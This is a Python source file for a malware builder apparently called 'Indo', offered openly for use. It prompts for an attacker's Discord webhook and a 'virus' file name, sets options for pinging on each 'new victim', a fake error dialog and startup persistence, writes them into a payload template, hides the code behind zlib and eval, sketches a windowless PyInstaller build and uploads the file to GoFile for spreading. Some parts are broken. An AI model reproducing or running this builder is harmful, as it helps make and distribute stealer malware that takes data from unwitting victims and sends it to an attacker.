import os
import random
import shutil
import subprocess
import sys
import time
from zlib import compress

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init


class Builder:
    def __init__(self) -> None:
        self.loading()

        if not self.check():
            exit()

        self.webhook = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Webhook; ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} {Fore.RED}Invalid Webhook.{Fore.RESET}")
            str(input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Press Anything For Exit."))
            sys.exit()

        self.filename = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Enter Your Virus File Name: ')

        self.ping = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET}Ping On New Victim? (y/n): ')

        if self.ping.lower() == 'y':
            self.ping = True
            self.pingtype = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Ping Type (Here/Everyone) (Default Options Is Here.) ').lower()

            if self.pingtype not in ["here", "everyone"]:
                self.pingtype == "here"
        else:
            self.ping = False
            self.pingtype = "none"

        self.error = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Fake Error With Your Virus Is Opening? (y/n): ')

        if self.error.lower() == 'y':
            self.error = True
        else:
            self.error = False
        self.startup = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do You Want Startup? (y/n): ')

        if self.startup.lower() == 'y':
            self.startup = True
        else:
            self.startup = False
        self.defender = False

        # self.compy = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Compile exe? (y/n): ')

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Virus Prepared.{Fore.RESET}')

        try:
            self.gofile_upload(self.filename)
        except:
            pass

        # run = input(
        #     f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Do you want to test the file? : ')
        # if run.lower() == 'y':
        #     self.run(self.filename)

        input(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
        sys.exit()

    def loading(self):
        p = Fore.WHITE + Style.DIM
        r = Fore.RED + Style.BRIGHT

        img = fr"""{p}
                                                        .___            .___
                                                        |   | ____    __| _/____
                                                        |   |/    \  / __ |/  _ \
                                                        |   |   |  \/ /_/ (  <_> )
                                                        |___|___|  /\____ |\____/ 
                                                                 \/      \/           

                Username: {os.getlogin()}
|"""

        with alive_bar(40) as bar:
            for _ in range(40):
                print(img)
                time.sleep(random.randint(1, 3) / 40)
                os.system('cls')
                bar()

            os.system('cls')

        print(Style.RESET_ALL)

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def random_string(self):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(15))

    def check(self):
        required_files = {'./Indo-main.py',
                          './requirements.txt'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')

        os.system('mode con:cols=150 lines=20')

        return True

    def icon_exe(self):
        self.icon_name = input(f'{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
            input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Press anything to exit...")

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
            input(f"{Fore.WHITE}[{Fore.RESET}+{Fore.WHITE}]{Fore.RESET} Press anything to exit...")



    def mk_file(self, filename, webhook):
        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')

        with open('./Indo-main.py', 'r', encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(code.replace('%webhook_here%', webhook)
                    .replace("\"%ping_enabled%\"", str(self.ping))
                    .replace("%ping_type%", self.pingtype)
                    .replace("\"%_error_enabled%\"", str(self.error))
                    .replace("\"%_startup_enabled%\"", str(self.startup))
                    .replace("\"%_defender_enabled%\"", str(self.defender)))

        time.sleep(2)
        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')

        with open(f"{filename}.py", mode='rb') as f:
            content = f.read()

        print(f"{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='{self.random_string()}',mode='exec'))"

    

    def compile(self, filename):
        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
        if self.compy == 'y':
            icon = "NONE"
            os.system('python -m PyInstaller --onefile --noconsole'+filename+'.py')
            # os.system(f'python -m PyInstaller --hidden-import wmi --hidden-import pycryptodome --onefile --noconsole --upx-dir=./tools --distpath ./ .\\{filename}.py')
        
        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')

    def run(self, filename):
        print(f'{Fore.WHITE}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.WHITE}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')

        if os.path.isfile(f'./{filename}.exe'):
            os.system(f'start ./{filename}.exe')
        elif os.path.isfile(f'./{filename}.py'):
            os.system(f'python ./{filename}.py')

  

        

 

    def gofile_upload(self, filename):
        gofile = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={
            'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']

        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')


if __name__ == '__main__':
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system('mode con:cols=212 lines=212')
        os.system("cls")

    Builder()